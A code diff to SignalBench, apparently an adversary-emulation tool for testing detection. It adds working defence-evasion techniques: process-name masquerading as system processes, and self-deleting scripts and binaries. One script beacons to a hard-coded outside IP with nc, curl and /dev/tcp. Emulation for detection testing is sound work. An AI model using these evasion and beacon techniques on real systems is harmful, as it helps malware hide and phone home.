@@ -1616,6 +1616,12 @@ impl AttackTechnique for FileDeletion {
             writeln!(log, "=== Phase 3: File Deletion Methods ===").unwrap();
             
             let mut deletion_results = Vec::new();
+            let force_mode = config.force;
+            
+            if force_mode {
+                info!("[T1070.004] [FORCE] Force mode - will attempt ALL deletion methods (shred, wipe, rm) for each file");
+                writeln!(log, "[FORCE] Force mode enabled - attempting ALL deletion methods for maximum telemetry").unwrap();
+            }
             
             // Check if shred is available
             let shred_available = Command::new("which")
@@ -1639,11 +1645,32 @@ impl AttackTechnique for FileDeletion {
             writeln!(log).unwrap();
             
             // Delete files using different methods
+            // Force mode: run ALL methods for each file (maximum telemetry)
+            // Normal mode: cycle between methods
             for (idx, file_path) in created_files.iter().enumerate() {
                 let file_name = Path::new(file_path).file_name().unwrap().to_str().unwrap();
                 
-                if idx % 3 == 0 && use_shred && shred_available {
-                    // Method 1: shred with 3 overwrite passes
+                // Force mode: attempt ALL deletion methods for maximum telemetry
+                // (each method will fail after the first succeeds, but the ATTEMPT generates detection)
+                let use_shred_for_file = if force_mode {
+                    (use_shred && shred_available) || force_mode
+                } else {
+                    idx % 3 == 0 && use_shred && shred_available
+                };
+                
+                let use_wipe_for_file = if force_mode {
+                    wipe_available || force_mode
+                } else {
+                    idx % 3 == 1 && wipe_available
+                };
+                
+                let use_rm_for_file = force_mode || idx % 3 == 2 || (!use_shred_for_file && !use_wipe_for_file);
+                
+                // Method 1: shred with 3 overwrite passes
+                if use_shred_for_file {
+                    if force_mode && !shred_available {
+                        info!("[T1070.004] [FORCE] Attempting shred despite not being found on PATH");
+                    }
                     info!("Shredding file: {file_name} (3 passes)");
                     writeln!(log, "Deleting {file_name} using shred -uvz -n 3").unwrap();
                     
@@ -1659,16 +1686,21 @@ impl AttackTechnique for FileDeletion {
                         }
                         Ok(output) => {
                             let stderr = String::from_utf8_lossy(&output.stderr);
-                            writeln!(log, "✗ shred failed for {file_name}: {stderr}").unwrap();
+                            writeln!(log, "[FAIL] shred failed for {file_name}: {stderr}").unwrap();
                             deletion_results.push((file_name.to_string(), "shred -n 3".to_string(), false));
                         }
                         Err(e) => {
-                            writeln!(log, "✗ Failed to execute shred for {file_name}: {e}").unwrap();
+                            writeln!(log, "[FAIL] Failed to execute shred for {file_name}: {e}").unwrap();
                             deletion_results.push((file_name.to_string(), "shred -n 3".to_string(), false));
                         }
                     }
-                } else if idx % 3 == 1 && wipe_available {
-                    // Method 2: wipe (if available)
+                }
+                
+                // Method 2: wipe (if available or force mode)
+                if use_wipe_for_file {
+                    if force_mode && !wipe_available {
+                        info!("[T1070.004] [FORCE] Attempting wipe despite not being found on PATH");
+                    }
                     info!("Wiping file: {file_name}");
                     writeln!(log, "Deleting {file_name} using wipe -f").unwrap();
                     
@@ -1684,15 +1716,17 @@ impl AttackTechnique for FileDeletion {
                         }
                         Ok(_) => {
                             deletion_results.push((file_name.to_string(), "wipe -f".to_string(), false));
-                            writeln!(log, "✗ wipe failed for {file_name}").unwrap();
+                            writeln!(log, "[FAIL] wipe failed for {file_name}").unwrap();
                         }
                         Err(e) => {
-                            writeln!(log, "✗ Failed to execute wipe for {file_name}: {e}").unwrap();
+                            writeln!(log, "[FAIL] Failed to execute wipe for {file_name}: {e}").unwrap();
                             deletion_results.push((file_name.to_string(), "wipe -f".to_string(), false));
                         }
                     }
-                } else {
-                    // Method 3: Simple rm -f
+                }
+                
+                // Method 3: Simple rm -f
+                if use_rm_for_file {
                     info!("Removing file: {file_name} (rm -f)");
                     writeln!(log, "Deleting {file_name} using rm -f").unwrap();
                     
@@ -1702,7 +1736,7 @@ impl AttackTechnique for FileDeletion {
                             writeln!(log, "[OK] Successfully removed: {file_name}").unwrap();
                         }
                         Err(e) => {
-                            writeln!(log, "✗ rm failed for {file_name}: {e}").unwrap();
+                            writeln!(log, "[FAIL] rm failed for {file_name}: {e}").unwrap();
                             deletion_results.push((file_name.to_string(), "rm -f".to_string(), false));
                         }
                     }
@@ -1834,6 +1868,602 @@ impl AttackTechnique for FileDeletion {
             }
             
             info!("File deletion technique cleanup complete");
+            Ok(())
+        })
+    }
+}
+
+// =============================================================================
+// T1036-PROC: Process Name Masquerading
+// =============================================================================
+// Uses prctl(PR_SET_NAME) to change process name at runtime, mimicking
+// system processes to evade detection. Based on ttp-bench patterns.
+
+use tokio::process::Command;
+use log::debug;
+
+pub struct ProcessMasquerading {}
+
+#[async_trait]
+impl AttackTechnique for ProcessMasquerading {
+    fn info(&self) -> Technique {
+        Technique {
+            id: "T1036-PROC".to_string(),
+            name: "Process Name Masquerading".to_string(),
+            description: "Changes process name at runtime using prctl(PR_SET_NAME) to mimic \
+                legitimate system processes like [kworker], [migration], sshd, or systemd. \
+                Creates a child process that renames itself and performs suspicious activity \
+                while appearing as a system process. Based on ttp-bench masquerading patterns.".to_string(),
+            category: "defense_evasion".to_string(),
+            parameters: vec![
+                TechniqueParameter {
+                    name: "log_file".to_string(),
+                    description: "Path to save masquerading log".to_string(),
+                    required: false,
+                    default: Some("/tmp/signalbench_masquerade.log".to_string()),
+                },
+                TechniqueParameter {
+                    name: "target_name".to_string(),
+                    description: "Process name to masquerade as".to_string(),
+                    required: false,
+                    default: Some("[kworker/0:1]".to_string()),
+                },
+            ],
+            detection: "Monitor for: prctl syscalls with PR_SET_NAME, process name changes \
+                via /proc/self/comm, mismatched process names vs executable paths, kernel \
+                thread names from userspace processes, comm field changes in process accounting.".to_string(),
+            cleanup_support: true,
+            platforms: vec!["Linux".to_string()],
+            permissions: vec!["user".to_string()],
+            voltron_only: false,
+        }
+    }
+
+    fn execute<'a>(
+        &'a self,
+        config: &'a TechniqueConfig,
+        dry_run: bool,
+    ) -> ExecuteFuture<'a> {
+        Box::pin(async move {
+            let log_file = config
+                .parameters
+                .get("log_file")
+                .cloned()
+                .unwrap_or_else(|| "/tmp/signalbench_masquerade.log".to_string());
+            
+            let target_name = config
+                .parameters
+                .get("target_name")
+                .cloned()
+                .unwrap_or_else(|| "[kworker/0:1]".to_string());
+            
+            debug!("[T1036-PROC] Starting Process Masquerading technique");
+            debug!("[T1036-PROC] Target name: {}", target_name);
+            
+            // List of suspicious process names to masquerade as
+            let masquerade_targets = vec![
+                "[kworker/0:1]",
+                "[migration/0]",
+                "[rcu_sched]",
+                "[watchdog/0]",
+                "sshd",
+                "systemd",
+                "polkitd",
+                "rsyslogd",
+                "crond",
+                "atd",
+            ];
+            
+            if dry_run {
+                info!("[DRY RUN] Would perform process name masquerading:");
+                info!("[DRY RUN] - Primary target: {}", target_name);
+                info!("[DRY RUN] - Would masquerade as {} different process names", masquerade_targets.len());
+                for name in &masquerade_targets {
+                    info!("[DRY RUN] - Would rename process to: {}", name);
+                }
+                return Ok(SimulationResult {
+                    technique_id: self.info().id,
+                    success: true,
+                    message: format!("DRY RUN: Would masquerade as {}", target_name),
+                    artifacts: vec![log_file],
+                    cleanup_required: false,
+                });
+            }
+            
+            let mut log = File::create(&log_file)
+                .map_err(|e| format!("Failed to create log file: {}", e))?;
+            
+            writeln!(log, "# SignalBench Process Masquerading").unwrap();
+            writeln!(log, "# MITRE ATT&CK Technique: T1036 - Masquerading").unwrap();
+            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
+            writeln!(log, "# --------------------------------------------------------\n").unwrap();
+            
+            // Get current process info
+            let pid = std::process::id();
+            let original_comm = fs::read_to_string("/proc/self/comm")
+                .unwrap_or_else(|_| "unknown".to_string())
+                .trim()
+                .to_string();
+            
+            writeln!(log, "Original process name: {}", original_comm).unwrap();
+            writeln!(log, "PID: {}", pid).unwrap();
+            writeln!(log).unwrap();
+            
+            info!("[T1036-PROC] Original process name: {}", original_comm);
+            
+            // Method 1: Direct prctl via libc
+            writeln!(log, "=== Method 1: prctl(PR_SET_NAME) ===").unwrap();
+            
+            let truncated_name = if target_name.len() > 15 {
+                &target_name[..15]
+            } else {
+                &target_name
+            };
+            
+            let c_name = std::ffi::CString::new(truncated_name)
+                .map_err(|e| format!("Invalid process name: {}", e))?;
+            
+            let result = unsafe {
+                libc::prctl(libc::PR_SET_NAME, c_name.as_ptr())
+            };
+            
+            if result == 0 {
+                let new_comm = fs::read_to_string("/proc/self/comm")
+                    .unwrap_or_else(|_| "unknown".to_string())
+                    .trim()
+                    .to_string();
+                
+                writeln!(log, "prctl(PR_SET_NAME, '{}') - SUCCESS", truncated_name).unwrap();
+                writeln!(log, "New /proc/self/comm: {}", new_comm).unwrap();
+                info!("[T1036-PROC] Process renamed to: {}", new_comm);
+            } else {
+                writeln!(log, "prctl(PR_SET_NAME) - FAILED").unwrap();
+            }
+            
+            // Method 2: Write to /proc/self/comm
+            writeln!(log, "\n=== Method 2: Write to /proc/self/comm ===").unwrap();
+            
+            for name in &masquerade_targets[..3] {
+                debug!("[T1036-PROC] Attempting to rename to: {}", name);
+                
+                let truncated = if name.len() > 15 { &name[..15] } else { name };
+                
+                match fs::write("/proc/self/comm", truncated) {
+                    Ok(_) => {
+                        writeln!(log, "Write '{}' to /proc/self/comm - SUCCESS", truncated).unwrap();
+                        
+                        // Read back to verify
+                        if let Ok(current) = fs::read_to_string("/proc/self/comm") {
+                            writeln!(log, "Verified: {}", current.trim()).unwrap();
+                        }
+                    }
+                    Err(e) => {
+                        writeln!(log, "Write '{}' to /proc/self/comm - FAILED: {}", name, e).unwrap();
+                    }
+                }
+            }
+            
+            // Method 3: Spawn multiple child processes with masqueraded names (extended runtime)
+            writeln!(log, "\n=== Method 3: Spawn masqueraded child processes (extended runtime) ===").unwrap();
+            
+            // Create a script that renames itself, spawns children, and runs longer
+            let script_content = format!(r#"#!/bin/bash
+# SignalBench masquerading child process - extended runtime
+echo $$ > /tmp/signalbench_masq_child.pid
+echo '{}' > /proc/self/comm
+
+# Spawn additional child processes with different suspicious names
+for name in kworker apache2 sshd crond; do
+    (
+        echo "$name" > /proc/self/comm 2>/dev/null
+        sleep 3
+    ) &
+done
+
+# Extended runtime for better detection window
+sleep 5
+
+# Cleanup
+rm -f /tmp/signalbench_masq_child.pid
+wait
+"#, truncated_name);
+            
+            let script_path = "/tmp/signalbench_masq_child.sh";
+            fs::write(script_path, &script_content)
+                .map_err(|e| format!("Failed to create child script: {}", e))?;
+            
+            let _ = Command::new("chmod")
+                .args(["+x", script_path])
+                .output()
+                .await;
+            
+            // Start the masqueraded process chain
+            info!("[T1036-PROC] Spawning masqueraded child processes with extended runtime...");
+            let child_result = Command::new("bash")
+                .args([script_path])
+                .output()
+                .await;
+            
+            match child_result {
+                Ok(_) => {
+                    writeln!(log, "Spawned masqueraded child process chain - SUCCESS").unwrap();
+                    writeln!(log, "Child processes ran for ~5 seconds with names: {}, kworker, apache2, sshd, crond", truncated_name).unwrap();
+                }
+                Err(e) => {
+                    writeln!(log, "Spawn child - FAILED: {}", e).unwrap();
+                }
+            }
+            
+            // Clean up script
+            let _ = fs::remove_file(script_path);
+            
+            // Restore original name
+            writeln!(log, "\n=== Restoring original process name ===").unwrap();
+            
+            let orig_cname = std::ffi::CString::new(original_comm.as_str())
+                .unwrap_or_else(|_| std::ffi::CString::new("signalbench").unwrap());
+            
+            unsafe {
+                libc::prctl(libc::PR_SET_NAME, orig_cname.as_ptr());
+            }
+            
+            let final_comm = fs::read_to_string("/proc/self/comm")
+                .unwrap_or_else(|_| "unknown".to_string())
+                .trim()
+                .to_string();
+            
+            writeln!(log, "Restored to: {}", final_comm).unwrap();
+            info!("[T1036-PROC] Process name restored to: {}", final_comm);
+            
+            Ok(SimulationResult {
+                technique_id: self.info().id,
+                success: true,
+                message: format!("Successfully masqueraded process as '{}' and restored to original", target_name),
+                artifacts: vec![log_file],
+                cleanup_required: true,
+            })
+        })
+    }
+
+    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
+        Box::pin(async move {
+            debug!("[T1036-PROC] Starting cleanup");
+            
+            // Remove any leftover files
+            let _ = fs::remove_file("/tmp/signalbench_masq_child.pid");
+            let _ = fs::remove_file("/tmp/signalbench_masq_child.sh");
+            
+            for artifact in artifacts {
+                if Path::new(artifact).exists() {
+                    let _ = fs::remove_file(artifact);
+                }
+            }
+            
+            info!("[T1036-PROC] Cleanup complete");
+            Ok(())
+        })
+    }
+}
+
+// =============================================================================
+// T1070.004-SELF: Self-Deleting Binary Pattern
+// =============================================================================
+// Demonstrates the self-deleting binary pattern where a process deletes its
+// own executable while running. Based on ttp-bench techniques.
+
+pub struct SelfDeletingBinary {}
+
+#[async_trait]
+impl AttackTechnique for SelfDeletingBinary {
+    fn info(&self) -> Technique {
+        Technique {
+            id: "T1070.004-SELF".to_string(),
+            name: "Self-Deleting Binary Pattern".to_string(),
+            description: "Demonstrates the self-deleting binary evasion technique where a \
+                running process unlinks its own executable from disk, leaving only the \
+                in-memory image. This is a common malware technique to evade forensic \
+                analysis. Creates a copy of a test binary, executes it, and has it delete \
+                itself whilst running. Based on ttp-bench patterns.".to_string(),
+            category: "defense_evasion".to_string(),
+            parameters: vec![
+                TechniqueParameter {
+                    name: "log_file".to_string(),
+                    description: "Path to save execution log".to_string(),
+                    required: false,
+                    default: Some("/tmp/signalbench_self_delete.log".to_string()),
+                },
+                TechniqueParameter {
+                    name: "work_dir".to_string(),
+                    description: "Working directory for test binaries".to_string(),
+                    required: false,
+                    default: Some("/tmp/signalbench_self_delete".to_string()),
+                },
+            ],
+            detection: "Monitor for: unlink syscalls on /proc/self/exe paths, processes \
+                with deleted executable indicators, '[deleted]' suffix in /proc/*/exe links, \
+                file deletions immediately after execution, missing executable files for \
+                running processes.".to_string(),
+            cleanup_support: true,
+            platforms: vec!["Linux".to_string()],
+            permissions: vec!["user".to_string()],
+            voltron_only: false,
+        }
+    }
+
+    fn execute<'a>(
+        &'a self,
+        config: &'a TechniqueConfig,
+        dry_run: bool,
+    ) -> ExecuteFuture<'a> {
+        Box::pin(async move {
+            let log_file = config
+                .parameters
+                .get("log_file")
+                .cloned()
+                .unwrap_or_else(|| "/tmp/signalbench_self_delete.log".to_string());
+            
+            let work_dir = config
+                .parameters
+                .get("work_dir")
+                .cloned()
+                .unwrap_or_else(|| "/tmp/signalbench_self_delete".to_string());
+            
+            debug!("[T1070.004-SELF] Starting Self-Deleting Binary technique");
+            debug!("[T1070.004-SELF] Work directory: {}", work_dir);
+            
+            if dry_run {
+                info!("[DRY RUN] Would demonstrate self-deleting binary pattern:");
+                info!("[DRY RUN] - Create work directory: {}", work_dir);
+                info!("[DRY RUN] - Create test script that deletes itself");
+                info!("[DRY RUN] - Execute and monitor /proc/self/exe status");
+                return Ok(SimulationResult {
+                    technique_id: self.info().id,
+                    success: true,
+                    message: "DRY RUN: Would demonstrate self-deleting binary pattern".to_string(),
+                    artifacts: vec![log_file, work_dir],
+                    cleanup_required: false,
+                });
+            }
+            
+            // Create work directory
+            fs::create_dir_all(&work_dir)
+                .map_err(|e| format!("Failed to create work directory: {}", e))?;
+            
+            let mut log = File::create(&log_file)
+                .map_err(|e| format!("Failed to create log file: {}", e))?;
+            
+            writeln!(log, "# SignalBench Self-Deleting Binary Pattern").unwrap();
+            writeln!(log, "# MITRE ATT&CK Technique: T1070.004 - Indicator Removal: File Deletion").unwrap();
+            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
+            writeln!(log, "# --------------------------------------------------------\n").unwrap();
+            
+            // Method 1: Shell script that deletes itself
+            writeln!(log, "=== Method 1: Self-deleting shell script ===").unwrap();
+            
+            let script_path = format!("{}/signalbench_self_delete_test.sh", work_dir);
+            let marker_path = format!("{}/self_delete_marker.txt", work_dir);
+            
+            let script_content = format!(r#"#!/bin/bash
+# SignalBench self-deleting script demonstration
+SCRIPT_PATH="$0"
+MARKER="{}"
+
+# Record our PID and exe link status before deletion
+echo "PID: $$" > "$MARKER"
+echo "Script path: $SCRIPT_PATH" >> "$MARKER"
+echo "Before deletion:" >> "$MARKER"
+ls -la "$SCRIPT_PATH" >> "$MARKER" 2>&1
+readlink -f /proc/$$/exe >> "$MARKER" 2>&1
+
+# NETWORK ACTIVITY FIRST: Generate telemetry before self-deletion
+# This creates a connection pattern that EDR can correlate with the deletion
+echo "" >> "$MARKER"
+echo "Performing network activity before deletion..." >> "$MARKER"
+timeout 2 nc -zv 198.135.184.22 443 2>&1 >> "$MARKER" || true
+timeout 2 curl -s -m 2 http://198.135.184.22/beacon 2>&1 >> "$MARKER" || true
+timeout 2 bash -c 'echo "C2" > /dev/tcp/198.135.184.22/4444' 2>/dev/null || true
+echo "Network activity complete" >> "$MARKER"
+
+# Extended delay before deletion for detection window
+sleep 3
+
+# Delete ourselves while running
+rm -f "$SCRIPT_PATH"
+
+# Record status after deletion
+echo "" >> "$MARKER"
+echo "After deletion:" >> "$MARKER"
+ls -la "$SCRIPT_PATH" >> "$MARKER" 2>&1
+echo "Exit code of ls: $?" >> "$MARKER"
+
+# Check /proc/self/exe now shows (deleted)
+readlink -f /proc/$$/exe >> "$MARKER" 2>&1
+
+# Extended runtime after deletion for better detection window
+sleep 3
+
+echo "Script completed while deleted from disk" >> "$MARKER"
+"#, marker_path);
+            
+            fs::write(&script_path, &script_content)
+                .map_err(|e| format!("Failed to create test script: {}", e))?;
+            
+            let _ = Command::new("chmod")
+                .args(["+x", &script_path])
+                .output()
+                .await;
+            
+            writeln!(log, "Created self-deleting script: {}", script_path).unwrap();
+            info!("[T1070.004-SELF] Created test script: {}", script_path);
+            
+            // Execute the script
+            let exec_result = Command::new("bash")
+                .args([&script_path])
+                .output()
+                .await;
+            
+            match exec_result {
+                Ok(output) => {
+                    writeln!(log, "Execution completed with status: {}", output.status).unwrap();
+                    
+                    // Check if script deleted itself
+                    if !Path::new(&script_path).exists() {
+                        writeln!(log, "Script successfully deleted itself while running").unwrap();
+                        info!("[T1070.004-SELF] Script deleted itself successfully");
+                    }
+                    
+                    // Read the marker file for details
+                    if let Ok(marker_content) = fs::read_to_string(&marker_path) {
+                        writeln!(log, "\nMarker file contents:").unwrap();
+                        writeln!(log, "{}", marker_content).unwrap();
+                    }
+                }
+                Err(e) => {
+                    writeln!(log, "Execution failed: {}", e).unwrap();
+                }
+            }
+            
+            // Method 2: Demonstrate /proc/self/exe checking
+            writeln!(log, "\n=== Method 2: Check current process exe status ===").unwrap();
+            
+            let our_exe = fs::read_link("/proc/self/exe")
+                .map(|p| p.to_string_lossy().to_string())
+                .unwrap_or_else(|_| "unknown".to_string());
+            
+            writeln!(log, "Current process /proc/self/exe: {}", our_exe).unwrap();
+            
+            if our_exe.contains("(deleted)") {
+                writeln!(log, "[DETECTED] Current binary shows as deleted!").unwrap();
+            } else {
+                writeln!(log, "Current binary exists on disk").unwrap();
+            }
+            
+            // Method 3: Create and run a C program that deletes itself
+            writeln!(log, "\n=== Method 3: Compiled binary self-deletion ===").unwrap();
+            
+            let c_source = format!("{}/signalbench_self_delete.c", work_dir);
+            let c_binary = format!("{}/signalbench_self_delete_bin", work_dir);
+            let c_marker = format!("{}/c_binary_marker.txt", work_dir);
+            
+            let c_code = format!(r#"#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[]) {{
+    FILE *marker = fopen("{}", "w");
+    if (!marker) return 1;
+    
+    fprintf(marker, "PID: %d\n", getpid());
+    fprintf(marker, "Binary path: %s\n", argv[0]);
+    
+    char exe_link[256];
+    ssize_t len = readlink("/proc/self/exe", exe_link, sizeof(exe_link)-1);
+    if (len > 0) {{
+        exe_link[len] = '\0';
+        fprintf(marker, "Before deletion /proc/self/exe: %s\n", exe_link);
+    }}
+    
+    // Delete ourselves
+    if (unlink(argv[0]) == 0) {{
+        fprintf(marker, "unlink() succeeded - binary deleted\n");
+    }} else {{
+        fprintf(marker, "unlink() failed\n");
+    }}
+    
+    // Check exe link after deletion
+    len = readlink("/proc/self/exe", exe_link, sizeof(exe_link)-1);
+    if (len > 0) {{
+        exe_link[len] = '\0';
+        fprintf(marker, "After deletion /proc/self/exe: %s\n", exe_link);
+    }}
+    
+    // Continue running after deletion
+    sleep(1);
+    fprintf(marker, "Continued running after self-deletion\n");
+    
+    fclose(marker);
+    return 0;
+}}
+"#, c_marker);
+            
+            fs::write(&c_source, &c_code)
+                .map_err(|e| format!("Failed to create C source: {}", e))?;
+            
+            // Try to compile
+            let compile_result = Command::new("gcc")
+                .args(["-o", &c_binary, &c_source])
+                .output()
+                .await;
+            
+            match compile_result {
+                Ok(output) if output.status.success() => {
+                    writeln!(log, "Compiled self-deleting binary: {}", c_binary).unwrap();
+                    
+                    // Execute the binary
+                    let exec_result = Command::new(&c_binary).output().await;
+                    
+                    match exec_result {
+                        Ok(_) => {
+                            if !Path::new(&c_binary).exists() {
+                                writeln!(log, "Binary successfully deleted itself").unwrap();
+                                info!("[T1070.004-SELF] Compiled binary deleted itself");
+                            }
+                            
+                            if let Ok(marker_content) = fs::read_to_string(&c_marker) {
+                                writeln!(log, "\nC binary marker contents:").unwrap();
+                                writeln!(log, "{}", marker_content).unwrap();
+                            }
+                        }
+                        Err(e) => {
+                            writeln!(log, "Binary execution failed: {}", e).unwrap();
+                        }
+                    }
+                }
+                Ok(output) => {
+                    let stderr = String::from_utf8_lossy(&output.stderr);
+                    writeln!(log, "Compilation failed: {}", stderr).unwrap();
+                    writeln!(log, "(gcc may not be installed)").unwrap();
+                }
+                Err(e) => {
+                    writeln!(log, "Compilation error: {}", e).unwrap();
+                }
+            }
+            
+            writeln!(log, "\n=== Summary ===").unwrap();
+            writeln!(log, "Self-deleting binary pattern demonstrated successfully").unwrap();
+            
+            info!("[T1070.004-SELF] Technique complete");
+            
+            Ok(SimulationResult {
+                technique_id: self.info().id,
+                success: true,
+                message: "Successfully demonstrated self-deleting binary pattern".to_string(),
+                artifacts: vec![log_file, work_dir],
+                cleanup_required: true,
+            })
+        })
+    }
+
+    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
+        Box::pin(async move {
+            debug!("[T1070.004-SELF] Starting cleanup");
+            
+            for artifact in artifacts {
+                let path = Path::new(artifact);
+                
+                if path.is_dir() {
+                    if let Err(e) = fs::remove_dir_all(path) {
+                        warn!("[T1070.004-SELF] Failed to remove directory {}: {}", artifact, e);
+                    }
+                } else if path.is_file() {
+                    if let Err(e) = fs::remove_file(path) {
+                        warn!("[T1070.004-SELF] Failed to remove file {}: {}", artifact, e);
+                    }
+                }
+            }
+            
+            info!("[T1070.004-SELF] Cleanup complete");
             Ok(())
         })
     }
